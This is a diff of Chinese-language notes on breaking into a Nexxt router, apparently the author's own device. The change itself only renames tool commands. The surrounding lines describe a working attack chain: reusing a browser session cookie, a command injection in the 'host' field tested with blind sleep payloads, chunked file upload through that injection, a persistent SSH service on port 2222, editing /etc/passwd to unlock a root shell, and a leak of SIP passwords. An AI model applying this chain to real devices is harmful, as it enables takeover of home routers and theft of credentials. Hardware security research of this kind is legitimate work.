@@ -45,7 +45,7 @@
   4. `nvget=login_confirm&cmd=4` → `login_status:"1"` 即已认证
 - **已知坑**：脚本复现该流程能检测到按键，但 `login_status` 不一定变 1（会话疑似绑定
   浏览器上下文）。**可靠做法**：浏览器登录一次 → 开发者工具导出 HAR →
-  `nexxt_session.py import-cookie capture.har` 复用 sessionID。浏览器不退出登录，会话一直有效。
+  `nexxt session import-cookie capture.har` 复用 sessionID。浏览器不退出登录，会话一直有效。
 
 ## 3. 命令注入（FW_058 已证实）
 
@@ -74,7 +74,7 @@ host = :::::::;<条件> && sleep${IFS}8
 实测可用：`test -f`、`grep -q`、`wc -c <f> | grep -q '^393'`、
 `md5sum <f> | grep -q <hash>`、`netstat -tln | grep -q :2222`、`test $(id -u) -eq 0`。
 
-## 5. 可靠文件传输（`tools/nexxt_transfer.py`）
+## 5. 可靠文件传输（统一 CLI：`nexxt transfer`）
 
 1. base64 → URL 安全字母（`+`→`-`，`/`→`_`）。
 2. 切成 ≤48 字符段，每段独立幂等写入 `printf %s <seg> | tee /tmp/nxseg_<tag>_NNN`。
@@ -87,7 +87,7 @@ host = :::::::;<条件> && sleep${IFS}8
 6. 执行是**异步且可能乱序/迟到**的：早先失败的写可能晚到并覆盖后来的正确内容
    （实测发生过）。传完再审计一遍。
 
-## 6. 持久 SSH（`tools/nexxt_ssh.py`）
+## 6. 持久 SSH（统一 CLI：`nexxt ssh`）
 
 `bootstrap` 做的事（全部可逆）：
 
@@ -161,6 +161,6 @@ ssh -i <私钥> -p 2222 \
 
 - 还原 root shell：`sed -i 's#^\(root:.*:\)[^:]*$#\1/bin/restricted_shell#' /etc/passwd`
   （或重启前 `cp /tmp/nx_passwd.bak /etc/passwd`）。
-- 移除 SSH：`python3 tools/nexxt_ssh.py teardown`。
+- 移除 SSH：`./nexxt ssh teardown`。
 - `/tmp` 产物重启自清；立即清理：`rm -f /tmp/nx* /tmp/k*.b64`。
 - 浏览器 HAR 含 `sessionID`，还可能含 VoIP 凭据（`deviceinfo` 会泄露 base64 的 SIP 密码）——用完删除。
